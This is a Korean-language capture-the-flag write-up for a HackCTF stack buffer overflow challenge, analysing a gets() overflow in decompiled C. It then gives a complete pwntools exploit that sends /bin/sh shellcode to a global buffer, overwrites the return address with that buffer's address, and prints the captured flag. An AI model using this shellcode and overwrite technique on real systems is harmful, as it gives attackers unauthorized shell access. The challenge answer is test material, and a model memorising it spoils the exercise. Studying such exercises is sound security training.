풀이	( 0805 아침 하루 종일 투자해서 풀어보기 )

IDA로 바이너리 코드(어셈블리언어로된) 번역하면


int __cdecl main(int argc, const char **argv, const char **envp)
{
	char s;			# 배열선언
	setvbuf(stdout, 0, 2, 0);	# 버퍼를 없앤다는 의미
	printf("Name : ");
	read(0, &name, 0x32);	#0x32 >> 10진수로 50바이트
	printf("input : ");		# 전역변수 name에 0x32 바이트 길이의 문자열을 입력할수 있다.
	gets(&s);			# 지역변수 s에는 gets()로 입력받기떄문에
	return 0;		# 버퍼오버플로우가 발생
}

이다

즉 read 함수와 gets함수로 입력을 받는다는것을 코드를 보고 알수있는데

read함수로 입력받는 name의 경우 전역변수 BSS영역에 존재한다.

gets 함수로 s에 버퍼를 받으므로 크기에 제한이 없다 따라서 충분히 버퍼오버플로우를
일으킬수 있다.


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
setvbuf

stream의 buffering 하는 방식과 buffering을 할 buffer를 지정한다.

즉 스트림 버퍼링 방식이다.

버퍼의 크기는 세번쨰 인자에 바이트 수로 전달된다.

만일 버퍼를 설정하지 않는다면 (두번쨰인자가 NULL이라면) 시스템을 동적으로,
함수에의해 요청된 크기 만큼 메모리를 할당하게 되며 이를 스트림의 버퍼로 사용함

mode 인자는 이버퍼를 fully buffered ,  line buffered, unbuffered 로 할지 결정함


fully buffered
> 한블록이 다채워지지 않았는데도 불구하고 스트림을 강제로 비워 (flush) 장비에 쓸수있는데
이는 fflush 함수를 호출하거나 fclose 함수를 호출해 파일을 닫으면 됨. 참고로 모든 버퍼는 프로그램 종료시
자동적으로 비워지게됨

line buffered
> 버퍼에 개행 문자가 입력될 떄마다 장비에 쓰여지게됨.

unbuffered
> 데이터는 버퍼와 같은 중간 경유지를 거치지 않고 직접적으로 쓰여지게 됨.
쓰기작업을 할떄 바로바로 쓰이게됨.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


풀이 방법 

checksec prob1 을 했을떄 아무것도 걸려있지 않는것을 볼수있다.

stack 에 실행권이 존재한다는 의미 따라서 쉘코드를 삽입하며 문제를 해결할수 있음

read를 통해 name에 쉘코드를 삽입하고 gets를 통해 main함수의 ret을 name의 주소로 덮어
씌우면 된다.


IDA에서 name 을 클릭하면 주소값을 확인할수 있는데 name은 0x0804A060 이다.

앞의 bss는 초기화 되지않은 정적변수를 의미함.

bss 영역의 컴파일 동안 어느 크기를 저장할것이라는 정보를 저장 , 런타임 중 메모리를
확보함으로 현재 정확한 주소를 알수없다. (정확하지 않음)


그리고 스택에 main+3 을 보면 0x14(20)의 공간을 할당한다. 

즉   우리가 넣어야할 버퍼의 위치는 0x14 이다. 하지만 s의 크기가 20밖에 되지않아

쉘코드를 저장할수없다. 그래서 버퍼에 더미값을 넣고 쉘코드를 버퍼 밖에 저장한 뒤

ret를 변조하여 쉘코드 주소를 가리키게 하면 된다.


@@@@@
name 은 전역변수로 선언되어 bss 영역에 존재하고 name은 초기화되지않은
전역변수로 고정주소 영역을 사용함.
@@@@@



페이로드를 작성하려면

즉 24바이트의 더미 + p32(쉘코드) 이다. 즉

name 부분에 쉘코드를 넣고 패킹을 돌리고 그것을 input  즉 gets 부분에 넣어주면 된다.


따라서

from pwn import *

p = remote('ctf.j0n9hyun.xyz',3003)

shell = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'

name = 0x804a060		
	
p.recvuntil("Name : ")
p.sendline(shell)

pay = "A"*24 + p32(name)

p.recvuntil("input : ")
p.sendline(pay)

p.interactive()


이다 그리고 실행시켜주면  쉘을 획득해서 flag 를 획득할수있다.


설명

remote로 호스트 잡아주고 shell 코드가 적힌 변수를 선언해주고

nmae 의 위치 주소를 적고 선언한다.
그리고 Name 에 쉘코드를 넣어야하니 Name에 shell 을 보내고 
그대로 페이로드를 작성한다 A*24 즉 더미 24바이트하고 p32로 패킹한 쉘코드

그리고 작성 한 페이를 input에 입력하고 전송하면 쉘을 획득가능하다.



flag 

HackCTF{1_l0v3_70p_pwn3r_m4lhyuk} 

